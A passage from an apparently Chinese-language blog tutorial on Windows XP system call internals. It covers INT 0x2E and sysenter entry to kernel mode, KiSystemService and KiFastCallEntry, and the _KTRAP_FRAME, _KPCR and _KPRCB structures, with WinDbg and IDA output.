class="string">&quot;FAST调用方式读取写入后读取INT写入的数据为：%s\n&quot;</span>,szRead);</span><br><span class="line">	</span><br><span class="line">	WriteProcessMemory_FAST(GetCurrentProcess(),(LPCVOID)((DWORD)szRead+<span class="number">4</span>),<span class="string">&quot;HHHH&quot;</span>,<span class="keyword">sizeof</span>(szWrite),&amp;dwReadLen);</span><br><span class="line">	ReadProcessMemory_FAST(GetCurrentProcess(),(LPCVOID)szRead,szBufferRead,<span class="keyword">sizeof</span>(szRead),&amp;dwReadLen);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;FAST调用方式读取写入后读取FAST写入的数据为：%s\n&quot;</span>,szRead);</span><br><span class="line"></span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/28/NCOkj3arnwZRpfo.png" alt="6.png"></p>
<h2 id="3-分析-INT-0x2E-和-sysenter"><a href="#3-分析-INT-0x2E-和-sysenter" class="headerlink" title="3 分析 INT 0x2E 和 sysenter"></a>3 分析 INT 0x2E 和 sysenter</h2><h3 id="3-1-中断门进0环"><a href="#3-1-中断门进0环" class="headerlink" title="3.1 中断门进0环"></a>3.1 中断门进0环</h3><p><img data-src="https://s2.loli.net/2022/01/26/lrzeQEsgUFGw8Tm.png" alt="4.png"></p>
<p>EAX保存系统调用号，内核函数编号。<br>EDX保存的指针，指向函数参数的起始地址。<br>然后通过中断门进入内核。且中断号都是0x2E。</p>
<p>分析：<strong>INT 0x2E进0环</strong>。<br>步骤一：在IDT表中找到0x2E号门描述符。<br>步骤二：分析CS&#x2F;SS&#x2F;ESP&#x2F;EIP的来源。<br>步骤三：分析EIP是什么。</p>
<p>查看IDT表中的中断门描述符看一下提权跳转过程：</p>
<ol>
<li><p>0x2E &#x3D; 46D，即第47项。8054ee00&#96;00082451</p>
<p><img data-src="https://s2.loli.net/2022/01/26/HNrdkgY6aeqyJmR.png" alt="5.png"></p>
<p>可以看到：</p>
<ul>
<li><p>0xE &#x3D; 1110：P &#x3D; 1，DPL &#x3D; 11，S &#x3D; 0（<strong>系统段</strong>）。 </p>
</li>
<li><p>Type &#x3D; 0xE &#x3D; 1110： <strong>为32位中断门</strong>。</p>
</li>
<li><p>代码段选择子：0008 &#x3D; 1 0 00</p>
<ul>
<li>RPL &#x3D; 00</li>
<li>TI &#x3D; 0，查GDT</li>
<li>Index &#x3D; 1，第二项，查得<strong>00</strong>cf9b<strong>00</strong>&#96;<strong>0000</strong>ffff，代码段Base &#x3D; 0x0。</li>
</ul>
</li>
<li><p>中断门偏移：0x80542451</p>
</li>
<li><p>中断门跳转执行地址 &#x3D; Code.Base + Interrupt.Offset &#x3D; 0x0 + 0x80542451 &#x3D; 0x80542451。该地址已经为高2G（0环）。</p>
<p><img data-src="https://s2.loli.net/2022/01/29/niLUjlR5sg4Q6JD.png" alt="15.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/19/RNkserCWtXMZF5D.png" alt="55.png"></p>
</li>
<li><p>得到EIP &#x3D; 0x80542451。这个是内核模块的<code>KiSystemService</code>函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; u <span class="number">0x80542451</span></span><br><span class="line">nt!KiSystemService:</span><br><span class="line"><span class="number">80542451</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">80542453</span> <span class="number">55</span>              push    ebp</span><br><span class="line"><span class="number">80542454</span> <span class="number">53</span>              push    ebx</span><br><span class="line"><span class="number">80542455</span> <span class="number">56</span>              push    esi</span><br><span class="line"><span class="number">80542456</span> <span class="number">57</span>              push    edi</span><br><span class="line"><span class="number">80542457</span> <span class="number">0f</span>a0            push    fs</span><br><span class="line"><span class="number">80542459</span> bb30000000      mov     ebx,<span class="number">30</span>h</span><br><span class="line"><span class="number">8054245</span>e <span class="number">668</span>ee3          mov     fs,bx</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>综上，已经知道CS0来自调用门中的代码段选择子，EIP &#x3D; Code.Base + Interrupt.Offset &#x3D; 0x80542451。接下来还要分析来自TSS的SS0和ESP0。</p>
<ul>
<li><p>获取TR的值。（任务段执行流程：3环CALL<strong>任务段选择子</strong> –&gt; 根据段选择子到GDT找到对应任务段描述符 –&gt; 将任务段描述符加载到TR寄存器，同时根据任务段中的Base找到TSS内存块的起始地址 –&gt; 根据TSS中的EIP去执行代码 –&gt; IRETD返回。）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; r tr</span><br><span class="line">tr=<span class="number">00000028</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>可以得到TR寄存器选择子的值为0x28 &#x3D; 00101 0 00，Index &#x3D; 5，查GDT表如下。获取TSS任务段描述符。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; r gdtr</span><br><span class="line">gdtr=<span class="number">8003f</span>000</span><br><span class="line">kd&gt; dq <span class="number">8003f</span>000</span><br><span class="line"><span class="number">8003f</span>000  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00</span>cf9b00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">8003f</span>010  <span class="number">00</span>cf9300`<span class="number">0000f</span>fff <span class="number">00</span>cffb00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">8003f</span>020  <span class="number">00</span>cff300`<span class="number">0000f</span>fff <span class="number">80008b</span>04`<span class="number">200020</span>ab</span><br></pre></td></tr></table></figure>

<p>得到GDT描述符 &#x3D; 8000<strong>8b</strong>04&#96;200020ab，为32位TSS任务段，TSS.Base &#x3D; 0x80042000。</p>
</li>
</ul>
<p><img data-src="https://s2.loli.net/2021/12/22/ECYDcgjBQMkbJmK.png" alt="79.png"></p>
<ul>
<li><p>可以得到：ESP0 &#x3D;0xaabe9de0，SS0 &#x3D; 0x0010。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dd <span class="number">0x80042000</span></span><br><span class="line"><span class="number">80042000</span>  <span class="number">0</span>c458b24 aabe9de0 <span class="number">8b</span>080010 <span class="number">758b</span>0855</span><br><span class="line"><span class="number">80042010</span>  eac14008 ffe68110 <span class="number">030000f</span>f <span class="number">06e400</span>a0</span><br><span class="line"><span class="number">80042020</span>  e1750855 <span class="number">08458b</span>5e <span class="number">0310e8</span>c1 c25d0845</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2021/12/20/y3UogsCh7piWzId.png" alt="76.png"></p>
</li>
</ul>
</li>
</ol>
<h3 id="3-2-快速调用进0环"><a href="#3-2-快速调用进0环" class="headerlink" title="3.2 快速调用进0环"></a>3.2 快速调用进0环</h3><p>在执行sysenter指令之前，操作系统必须指定0环的CS段、SS段、EIP以及ESP，SS &#x3D; CS+8。操作系统会提前将CS&#x2F;SS&#x2F;ESP&#x2F;EIP的值存储在MSR寄存器中，sysenter指令执行时，CPU会将MSR寄存器中的值直接写入相关寄存器，没有读内存的过程，所以叫快速调用，本质是一样的！</p>
<table>
<thead>
<tr>
<th>MSR</th>
<th>地址</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>IA32_SYSENTER_CS</td>
<td>174H</td>
<td>低16位值指定了特权级0的代码段和栈段的段选择符</td>
</tr>
<tr>
<td>IA32_SYSENTER_ESP</td>
<td>175H</td>
<td>内核栈指针的32 位偏移</td>
</tr>
<tr>
<td>IA32_SYSENTER_EIP</td>
<td>176H</td>
<td>目标例程的32位偏移</td>
</tr>
</tbody></table>
<p>可以通过<code>RDMSR/WRMST</code>来进行读写（操作系统使用WRMST写该寄存器）:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; rdmsr <span class="number">174</span></span><br><span class="line">msr[<span class="number">174</span>] = <span class="number">00000000</span>`<span class="number">00000008</span>	<span class="comment">//查看CS</span></span><br><span class="line">kd&gt; rdmsr <span class="number">175</span></span><br><span class="line">msr[<span class="number">175</span>] = <span class="number">00000000</span>`f7a1a000	<span class="comment">//查看ESP</span></span><br><span class="line">kd&gt; rdmsr <span class="number">176</span></span><br><span class="line">msr[<span class="number">176</span>] = <span class="number">00000000</span>`<span class="number">80542520</span>	<span class="comment">//查看EIP</span></span><br><span class="line">  SS = CS + <span class="number">8</span> = <span class="number">0x8</span> + <span class="number">8</span> = <span class="number">0x10</span></span><br><span class="line">  </span><br><span class="line">kd&gt; u <span class="number">80542520</span></span><br><span class="line">nt!KiFastCallEntry:</span><br><span class="line"><span class="number">80542520</span> b923000000      mov     ecx,<span class="number">23</span>h</span><br><span class="line"><span class="number">80542525</span> <span class="number">6</span>a30            push    <span class="number">30</span>h</span><br><span class="line"><span class="number">80542527</span> <span class="number">0f</span>a1            pop     fs</span><br><span class="line"><span class="number">80542529</span> <span class="number">8</span>ed9            mov     ds,cx</span><br><span class="line"><span class="number">8054252b</span> <span class="number">8</span>ec1            mov     es,cx</span><br><span class="line"><span class="number">8054252</span>d <span class="number">648b</span>0d40000000  mov     ecx,dword ptr fs:[<span class="number">40</span>h]</span><br><span class="line"><span class="number">80542534</span> <span class="number">8b</span>6104          mov     esp,dword ptr [ecx+<span class="number">4</span>]</span><br><span class="line"><span class="number">80542537</span> <span class="number">6</span>a23            push    <span class="number">23</span>h</span><br></pre></td></tr></table></figure>

<p>操作系统启动的时候就已经把这些值写入到MSR寄存器中了。</p>
<h3 id="3-3-总结"><a href="#3-3-总结" class="headerlink" title="3.3 总结"></a>3.3 总结</h3><p>API通过中断门进0环：<br>    1)  固定中断号为0x2E<br>    2)  CS&#x2F;EIP由门描述符提供，ESP&#x2F;SS由TSS提供<br>    3)  进入0环后执行的内核函数：<code>NT!KiSystemService</code></p>
<p>API通过sysenter指令进0环：<br>    1)  CS&#x2F;ESP&#x2F;EIP由MSR寄存器提供(SS是算出来的)<br>    2)  进入0环后执行的内核函数：<code>NT!KiFastCallEntry</code></p>
<p>内核模块：<code>ntoskrnl.exe/ntkrnlpa.exe</code>（10-10-12&#x2F;2-9-9-12）</p>
<h2 id="4-进入0环后分析"><a href="#4-进入0环后分析" class="headerlink" title="4 进入0环后分析"></a>4 进入0环后分析</h2><p>之前的课程，我们学习了API系统调用在3环部分做的事情，有两种方式进0环，分别是中断门<code>int 0x2e</code>和快速调用<code>sysenter</code>。通过中断门进入0环后，会调用函数<code>KiSystemService</code>、通过快速调用进入0环后会调用函数<code>KiFastCallEntry</code>。</p>
<div class="note success"><p>分析之前，思考四个问题：</p>
<ol>
<li>进0环后，原来的寄存器存在哪里？</li>
<li>如何根据系统调用号（eax中存储）找到要执行的内核函数？</li>
<li>调用时参数是存储到3环的堆栈，如何传递给内核函数？</li>
<li>2种调用方式是如何返回到3环的？</li>
</ol>
</div>

<p>要分析 KiSystemService 和 KiFastCallEntry ，我们需要先了解几个结构体，_Trap_Frame，_ETHREAD，_KTHREAD，_KPCR，_NT_TIB 和 _KPRCB。</p>
<p>接下来，按照 KiSystemService 代码执行顺序，依次介绍涉及到的结构体。</p>
<h3 id="4-1-分析KiSystemService"><a href="#4-1-分析KiSystemService" class="headerlink" title="4.1 分析KiSystemService"></a>4.1 分析KiSystemService</h3><p>本节通过分析中断门<code>int 0x2e</code>进入0环后，调用函数<code>KiSystemService</code>的过程，解释线程进0环后，原来的寄存器存在哪里？</p>
<p>使用IDA Pro打开ntkrnlpa.exe，并连接远程ntkrnlpa.pdb文件（<a href="https://catecat.top/post/WinXP-Driver/">Windows XP 驱动开发（一）</a>第二章节）。</p>
<ol>
<li><p>Alt+T搜索_IDT。</p>
<p><img data-src="https://s2.loli.net/2022/02/17/kcvgJG2BRV8hnqx.png" alt="8.png"></p>
</li>
<li><p>双击后如下。</p>
<p><img data-src="https://s2.loli.net/2022/02/17/UGBcpeYkAdNFqOI.png" alt="9.png"></p>
</li>
<li><p>找到<code>0x2e</code>对应的<code>KiSystemService</code>函数然后双击。待会儿分析<code>push 0</code>的含义。</p>
<p><img data-src="https://s2.loli.net/2022/02/17/DPSQvG9mfuZ4jrJ.png" alt="10.png"></p>
</li>
<li><p>保存3环的通用寄存器。</p>
<ul>
<li>从3环进入0环的时候，CPU会往0环的堆栈压5个值：eip、cs、eflag、esp、ss。</li>
<li>但是操作系统会将3环的寄存器都保存起来，方便从0环返回，于是操作系统就维护了一个<code>_Trap_Frame</code>结构来保存这些3环的寄存器。</li>
</ul>
</li>
</ol>
<h3 id="4-2-Trap-Frame结构"><a href="#4-2-Trap-Frame结构" class="headerlink" title="4.2 _Trap_Frame结构"></a>4.2 _Trap_Frame结构</h3><p>首先复习一下TSS表，一个CPU只有一张TSS表，但是系统里有成百上千的线程，线程进0环时，假设使用中断门，0环的ESP和SS从TSS表获取，怎么保证每个线程都有自己的堆栈，不互相冲突呢？答案是，线程切换时会修改TSS表，确保每个线程执行时，TSS里的ESP，SS都对应当前线程。</p>
<p><code>_Trap_Frame</code>是线程在0环的堆栈结构，由操作系统维护。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _KTrap_Frame -v</span><br><span class="line">nt!_KTRAP_FRAME</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">KTRAP_FRAME</span>, 35 <span class="title">elements</span>, 0<span class="title">x8c</span> <span class="title">bytes</span></span></span><br><span class="line"><span class="class">   +0<span class="title">x000</span> <span class="title">DbgEbp</span>           :</span> Uint4B</span><br><span class="line">   +<span class="number">0x004</span> DbgEip           : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> DbgArgMark       : Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> DbgArgPointer    : Uint4B</span><br><span class="line">   +<span class="number">0x010</span> TempSegCs        : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> TempEsp          : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> Dr0              : Uint4B</span><br><span class="line">   +<span class="number">0x01c</span> Dr1              : Uint4B</span><br><span class="line">   +<span class="number">0x020</span> Dr2              : Uint4B</span><br><span class="line">   +<span class="number">0x024</span> Dr3              : Uint4B</span><br><span class="line">   +<span class="number">0x028</span> Dr6              : Uint4B</span><br><span class="line">   +<span class="number">0x02c</span> Dr7              : Uint4B</span><br><span class="line">   +<span class="number">0x030</span> SegGs            : Uint4B</span><br><span class="line">   +<span class="number">0x034</span> SegEs            : Uint4B</span><br><span class="line">   +<span class="number">0x038</span> SegDs            : Uint4B</span><br><span class="line">   +<span class="number">0x03c</span> Edx              : Uint4B</span><br><span class="line">   +<span class="number">0x040</span> Ecx              : Uint4B</span><br><span class="line">   +<span class="number">0x044</span> Eax              : Uint4B</span><br><span class="line">   +<span class="number">0x048</span> PreviousPreviousMode : Uint4B</span><br><span class="line">   +<span class="number">0x04c</span> ExceptionList    : Ptr32 to <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span>, 2 <span class="title">elements</span>, 0<span class="title">x8</span> <span class="title">bytes</span></span></span><br><span class="line"><span class="class">   +0<span class="title">x050</span> <span class="title">SegFs</span>            :</span> Uint4B</span><br><span class="line">   +<span class="number">0x054</span> Edi              : Uint4B</span><br><span class="line">   +<span class="number">0x058</span> Esi              : Uint4B</span><br><span class="line">   +<span class="number">0x05c</span> Ebx              : Uint4B</span><br><span class="line">   +<span class="number">0x060</span> Ebp              : Uint4B</span><br><span class="line">   +<span class="number">0x064</span> ErrCode          : Uint4B</span><br><span class="line">   +<span class="number">0x068</span> Eip              : Uint4B</span><br><span class="line">   +<span class="number">0x06c</span> SegCs            : Uint4B</span><br><span class="line">   +<span class="number">0x070</span> EFlags           : Uint4B</span><br><span class="line">   +<span class="number">0x074</span> HardwareEsp      : Uint4B</span><br><span class="line">   +<span class="number">0x078</span> HardwareSegSs    : Uint4B</span><br><span class="line">   +<span class="number">0x07c</span> V86Es            : Uint4B</span><br><span class="line">   +<span class="number">0x080</span> V86Ds            : Uint4B</span><br><span class="line">   +<span class="number">0x084</span> V86Fs            : Uint4B</span><br><span class="line">   +<span class="number">0x088</span> V86Gs            : Uint4B</span><br></pre></td></tr></table></figure>

<div class="note danger"><p>一个线程一个<code>_Trap_Frame</code>结构，每个线程有一个自己的ESP0，该ESP0指示该线程0环下的<mark class="label warning">堆栈</mark>（<code>_Trap_Frame</code>结构）在哪。</p>
</div>

<p><img data-src="https://s2.loli.net/2022/02/17/yoJmLCOheZuVgKH.png" alt="11.png"></p>
<p>其中：</p>
<ul>
<li>高4个成员仅在虚拟8086模式下使用。</li>
<li>从TSS中获取的ESP0一开始指向0x7C。（从TSS中获取ESP0后才能知道0环的堆栈在哪）</li>
<li>从0x68～0x78由中断门进入0环时CPU自己填充。</li>
<li>一个线程一个<code>_Trap_Frame</code>结构。</li>
<li>一个CPU只有一块TSS内存块，每次线程切换时，TSS中的值都被更新为当前线程对应的值。</li>
</ul>
<p>结合<code>_Trap_Frame</code>结构分析函数<code>KiSystemService</code>分析：</p>
<p><img data-src="https://s2.loli.net/2022/02/18/hQydqPimblTR4GH.png" alt="12.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">push    <span class="number">0</span>	<span class="comment">//push ErrCode</span></span><br><span class="line">push    ebp</span><br><span class="line">push    ebx</span><br><span class="line">push    esi</span><br><span class="line">push    edi</span><br><span class="line">push    fs</span><br><span class="line">  </span><br><span class="line">mov     ebx, <span class="number">30</span>h</span><br><span class="line">mov     fs, bx	<span class="comment">//fs = 0x30 --&gt; 00110 0 00 --&gt; GDT --&gt;ffc093df`f0000001(数据段)</span></span><br><span class="line">push    dword ptr ds:<span class="number">0F</span>FDFF000h</span><br><span class="line">mov     dword ptr ds:<span class="number">0F</span>FDFF000h,OFFFFFFFFh</span><br><span class="line">mov     esi,ds:<span class="number">0F</span>FDFF124h</span><br><span class="line">push    dword ptr [esi+<span class="number">140</span>h]</span><br><span class="line">sub     esp,<span class="number">48</span>h</span><br><span class="line">mov     ebx,[esp+<span class="number">68</span>h+arg_0]</span><br><span class="line"><span class="keyword">and</span>     ebx,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>可以看到段寄存器FS的在GDT表中对应的段描述符为ffc093df&#96;f0000001，是一个数据段，FS.Base &#x3D; 0xFFDFF000。</p>
<p>此时的FS有了新的含义，<mark class="label warning">在3环，FS[0]指向TEB结构</mark>。但是在0环FS段寄存器被重新赋值，也有了新的意义，<mark class="label success">0环的FS指向一个KPCR的结构体</mark>。</p>
<h3 id="4-3-KPCR结构"><a href="#4-3-KPCR结构" class="headerlink" title="4.3 _KPCR结构"></a>4.3 _KPCR结构</h3><p>KPCR是个结构体，用来<strong>描述CPU状态</strong>。叫CPU控制区（Processor Control Region）。</p>
<p>CPU也有自己的控制块，每一个CPU有一个，叫KPCR。</p>
<div class="note default"><p>0环下FS段寄存器的基址，即FS[0]指向KPCR结构，这里为<code>0xFFDFF000</code>。</p>
</div>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _KPCR</span><br><span class="line">nt!_KPCR</span><br><span class="line">   +<span class="number">0x000</span> NtTib            : _NT_TIB</span><br><span class="line">   +<span class="number">0x01c</span> SelfPcr          : Ptr32 _KPCR</span><br><span class="line">   +<span class="number">0x020</span> Prcb             : Ptr32 _KPRCB</span><br><span class="line">   +<span class="number">0x024</span> Irql             : UChar</span><br><span class="line">   +<span class="number">0x028</span> IRR              : Uint4B</span><br><span class="line">   +<span class="number">0x02c</span> IrrActive        : Uint4B</span><br><span class="line">   +<span class="number">0x030</span> IDR              : Uint4B</span><br><span class="line">   +<span class="number">0x034</span> KdVersionBlock   : Ptr32 Void</span><br><span class="line">   +<span class="number">0x038</span> IDT              : Ptr32 _KIDTENTRY</span><br><span class="line">   +<span class="number">0x03c</span> GDT              : Ptr32 _KGDTENTRY</span><br><span class="line">   +<span class="number">0x040</span> TSS              : Ptr32 _KTSS</span><br><span class="line">   +<span class="number">0x044</span> MajorVersion     : Uint2B</span><br><span class="line">   +<span class="number">0x046</span> MinorVersion     : Uint2B</span><br><span class="line">   +<span class="number">0x048</span> SetMember        : Uint4B</span><br><span class="line">   +<span class="number">0x04c</span> StallScaleFactor : Uint4B</span><br><span class="line">   +<span class="number">0x050</span> DebugActive      : UChar</span><br><span class="line">   +<span class="number">0x051</span> Number           : UChar</span><br><span class="line">   +<span class="number">0x052</span> Spare0           : UChar</span><br><span class="line">   +<span class="number">0x053</span> SecondLevelCacheAssociativity : UChar</span><br><span class="line">   +<span class="number">0x054</span> VdmAlert         : Uint4B</span><br><span class="line">   +<span class="number">0x058</span> KernelReserved   : [<span class="number">14</span>] Uint4B</span><br><span class="line">   +<span class="number">0x090</span> SecondLevelCacheSize : Uint4B</span><br><span class="line">   +<span class="number">0x094</span> HalReserved      : [<span class="number">16</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0d4</span> InterruptMode    : Uint4B</span><br><span class="line">   +<span class="number">0x0d8</span> Spare1           : UChar</span><br><span class="line">   +<span class="number">0x0dc</span> KernelReserved2  : [<span class="number">17</span>] Uint4B</span><br><span class="line">   +<span class="number">0x120</span> PrcbData         : _KPRCB</span><br></pre></td></tr></table></figure>

<p>查看CPU数量（这里是单核）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dd KeNumberProcessors </span><br><span class="line"><span class="number">80556</span>a60  <span class="number">00000001</span> <span class="number">00000006</span> <span class="number">00008e0</span>a a0013fff</span><br><span class="line"><span class="number">80556</span>a70  <span class="number">806</span>ceec0 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000061</span></span><br></pre></td></tr></table></figure>

<p>_KPCR结构中比较重要的两个结构（第一个和最后一个）：<mark class="label info">_NT_TIB</mark>、<mark class="label primary">_KPRCB</mark></p>
<h4 id="4-3-1-NT-TIB结构"><a href="#4-3-1-NT-TIB结构" class="headerlink" title="4.3.1 _NT_TIB结构"></a>4.3.1 _NT_TIB结构</h4><p>先分析第一个结构<mark class="label info">_NT_TIB</mark>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _NT_TIB</span><br><span class="line">ntdll!_NT_TIB</span><br><span class="line">   +<span class="number">0x000</span> ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> StackBase        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x008</span> StackLimit       : Ptr32 Void</span><br><span class="line">   +<span class="number">0x00c</span> SubSystemTib     : Ptr32 Void</span><br><span class="line">   +<span class="number">0x010</span> FiberData        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x010</span> Version          : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> ArbitraryUserPointer : Ptr32 Void</span><br><span class="line">   +<span class="number">0x018</span> Self             : Ptr32 _NT_TIB	<span class="comment">//结构体指针指向自己</span></span><br></pre></td></tr></table></figure>

<p>第一个成员<code>_EXCEPTION_REGISTRATION_RECORD</code>是一个异常链表，存储的是异常的处理函数。</p>
<p>接着分析<code>KiSystemService</code>函数和<code>_Trap_Frame</code>结构、<code>_KPCR</code>结构：</p>
<p><img data-src="https://s2.loli.net/2022/02/18/7SsVL8M3bTDrHAa.png" alt="13.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">push    dword ptr ds:<span class="number">0F</span>FDFF000h</span><br><span class="line">mov     dword ptr ds:<span class="number">0F</span>FDFF000h,OFFFFFFFFh</span><br></pre></td></tr></table></figure>

<p>PUSH的作用就是保存老的异常链表，然后将新的<code>ExceptionList</code>设为-1。</p>
<h4 id="4-3-2-KPRCB结构"><a href="#4-3-2-KPRCB结构" class="headerlink" title="4.3.2 _KPRCB结构"></a>4.3.2 _KPRCB结构</h4><p>下面列举该结构的成员：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _KPRCB</span><br><span class="line">ntdll!_KPRCB</span><br><span class="line">   +<span class="number">0x000</span> MinorVersion     : Uint2B</span><br><span class="line">   +<span class="number">0x002</span> MajorVersion     : Uint2B</span><br><span class="line">   +<span class="number">0x004</span> CurrentThread    : Ptr32 _KTHREAD	<span class="comment">//当前CPU所执行线程的_ETHREAD</span></span><br><span class="line">   +<span class="number">0x008</span> NextThread       : Ptr32 _KTHREAD	<span class="comment">//下一个_ETHREAD</span></span><br><span class="line">   +<span class="number">0x00c</span> IdleThread       : Ptr32 _KTHREAD</span><br><span class="line">   +<span class="number">0x010</span> Number           : Char		<span class="comment">//CPU编号</span></span><br><span class="line">   +<span class="number">0x011</span> Reserved         : Char</span><br><span class="line">   +<span class="number">0x012</span> BuildType        : Uint2B</span><br><span class="line">   +<span class="number">0x014</span> SetMember        : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> CpuType          : Char</span><br><span class="line">   +<span class="number">0x019</span> CpuID            : Char</span><br><span class="line">   +<span class="number">0x01a</span> CpuStep          : Uint2B</span><br><span class="line">   +<span class="number">0x01c</span> ProcessorState   : _KPROCESSOR_STATE</span><br><span class="line">   +<span class="number">0x33c</span> KernelReserved   : [<span class="number">16</span>] Uint4B</span><br><span class="line">   +<span class="number">0x37c</span> HalReserved      : [<span class="number">16</span>] Uint4B</span><br><span class="line">   +<span class="number">0x3bc</span> PrcbPad0         : [<span class="number">92</span>] UChar</span><br><span class="line">   +<span class="number">0x418</span> LockQueue        : [<span class="number">16</span>] _KSPIN_LOCK_QUEUE</span><br><span class="line">   +<span class="number">0x498</span> PrcbPad1         : [<span class="number">8</span>] UChar</span><br><span class="line">   +<span class="number">0x4a0</span> NpxThread        : Ptr32 _KTHREAD</span><br><span class="line">   +<span class="number">0x4a4</span> InterruptCount   : Uint4B</span><br><span class="line">   +<span class="number">0x4a8</span> KernelTime       : Uint4B</span><br><span class="line">   +<span class="number">0x4ac</span> UserTime         : Uint4B</span><br><span class="line">   +<span class="number">0x4b0</span> DpcTime          : Uint4B</span><br><span class="line">   +<span class="number">0x4b4</span> DebugDpcTime     : Uint4B</span><br><span class="line">   +<span class="number">0x4b8</span> InterruptTime    : Uint4B</span><br><span class="line">   +<span class="number">0x4bc</span> AdjustDpcThreshold : Uint4B</span><br><span class="line">   +<span class="number">0x4c0</span> PageColor        : Uint4B</span><br><span class="line">   +<span class="number">0x4c4</span> SkipTick         : Uint4B</span><br><span class="line">   +<span class="number">0x4c8</span> MultiThreadSetBusy : UChar</span><br><span class="line">   +<span class="number">0x4c9</span> Spare2           : [<span class="number">3</span>] UChar</span><br><span class="line">   +<span class="number">0x4cc</span> ParentNode       : Ptr32 _KNODE</span><br><span class="line">   +<span class="number">0x4d0</span> MultiThreadProcessorSet : Uint4B</span><br><span class="line">   +<span class="number">0x4d4</span> MultiThreadSetMaster : Ptr32 _KPRCB</span><br><span class="line">   +<span class="number">0x4d8</span> ThreadStartCount : [<span class="number">2</span>] Uint4B</span><br><span class="line">   +<span class="number">0x4e0</span> CcFastReadNoWait : Uint4B</span><br><span class="line">   +<span class="number">0x4e4</span> CcFastReadWait   : Uint4B</span><br><span class="line">   +<span class="number">0x4e8</span> CcFastReadNotPossible : Uint4B</span><br><span class="line">   +<span class="number">0x4ec</span> CcCopyReadNoWait : Uint4B</span><br><span class="line">   +<span class="number">0x4f0</span> CcCopyReadWait   : Uint4B</span><br><span class="line">   +<span class="number">0x4f4</span> CcCopyReadNoWaitMiss : Uint4B</span><br><span class="line">   +<span class="number">0x4f8</span> KeAlignmentFixupCount : Uint4B</span><br><span class="line">   +<span class="number">0x4fc</span> KeContextSwitches : Uint4B</span><br><span class="line">   +<span class="number">0x500</span> KeDcacheFlushCount : Uint4B</span><br><span class="line">   +<span class="number">0x504</span> KeExceptionDispatchCount : Uint4B</span><br><span class="line">   +<span class="number">0x508</span> KeFirstLevelTbFills : Uint4B</span><br><span class="line">   +<span class="number">0x50c</span> KeFloatingEmulationCount : Uint4B</span><br><span class="line">   +<span class="number">0x510</span> KeIcacheFlushCount : Uint4B</span><br><span class="line">   +<span class="number">0x514</span> KeSecondLevelTbFills : Uint4B</span><br><span class="line">   +<span class="number">0x518</span> KeSystemCalls    : Uint4B</span><br><span class="line">   +<span class="number">0x51c</span> SpareCounter0    : [<span class="number">1</span>] Uint4B</span><br><span class="line">   +<span class="number">0x520</span> PPLookasideList  : [<span class="number">16</span>] _PP_LOOKASIDE_LIST</span><br><span class="line">   +<span class="number">0x5a0</span> PPNPagedLookasideList : [<span class="number">32</span>] _PP_LOOKASIDE_LIST</span><br><span class="line">   +<span class="number">0x6a0</span> PPPagedLookasideList : [<span class="number">32</span>] _PP_LOOKASIDE_LIST</span><br><span class="line">   +<span class="number">0x7a0</span> PacketBarrier    : Uint4B</span><br><span class="line">   +<span class="number">0x7a4</span> ReverseStall     : Uint4B</span><br><span class="line">   +<span class="number">0x7a8</span> IpiFrame         : Ptr32 Void</span><br><span class="line">   +<span class="number">0x7ac</span> PrcbPad2         : [<span class="number">52</span>] UChar</span><br><span class="line">   +<span class="number">0x7e0</span> CurrentPacket    : [<span class="number">3</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0x7ec</span> TargetSet        : Uint4B</span><br><span class="line">   +<span class="number">0x7f0</span> WorkerRoutine    : Ptr32     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x7f4</span> IpiFrozen        : Uint4B</span><br><span class="line">   +<span class="number">0x7f8</span> PrcbPad3         : [<span class="number">40</span>] UChar</span><br><span class="line">   +<span class="number">0x820</span> RequestSummary   : Uint4B</span><br><span class="line">   +<span class="number">0x824</span> SignalDone       : Ptr32 _KPRCB</span><br><span class="line">   +<span class="number">0x828</span> PrcbPad4         : [<span class="number">56</span>] UChar</span><br><span class="line">   +<span class="number">0x860</span> DpcListHead      : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x868</span> 